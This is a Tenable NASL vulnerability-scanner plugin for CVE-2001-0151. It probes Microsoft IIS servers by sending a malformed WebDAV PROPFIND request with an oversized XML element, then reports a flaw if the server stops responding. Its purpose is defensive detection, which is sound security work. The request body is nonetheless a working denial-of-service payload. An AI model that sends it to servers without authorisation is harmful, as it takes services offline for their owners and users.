#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# This security check is heavily based on Georgi Guninski's post
# on the bugtraq mailing list

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10631);
  script_version("1.40");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2001-0151");
  script_bugtraq_id(2453);
  script_xref(name:"MSKB", value:"291845");
  script_xref(name:"MSFT", value:"MS01-016");

  script_name(english:"Microsoft IIS WebDAV Malformed PROPFIND Request Remote DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service.");
  script_set_attribute(attribute:"description", value:
"It was possible to disable the remote IIS server
by making a specially formed PROPFIND request.");
  script_set_attribute(attribute:"see_also", value:"https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2001/ms01-016");
  script_set_attribute(attribute:"solution", value:
"Disable the WebDAV extensions, as well as the PROPFIND method.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/03/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2001/03/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2001-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function dos(port)
{
 local_var	xml, r;

 xml = 	'<?xml version="1.0"?><a:propfind xmlns:a="DAV:" xmlns:u="over:"><a:prop><a:displayname /><u:' + crap(128008)	+ ' /></a:prop></a:propfind>\r\n';

 r = http_send_recv3(port: port, item: '/', method: 'PROPFIND', data: xml,
   add_headers: make_array('Content-Type', 'text/xml') );	
}

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);

banner = get_http_banner(port:port);
if ("Microsoft-IIS" >!< banner ) exit(0);

for (i = 1; i <= 2; i ++)
{
 dos(port:port);
 sleep(i);
}

if (http_is_dead(port: port, retry: 3)) security_hole(port);
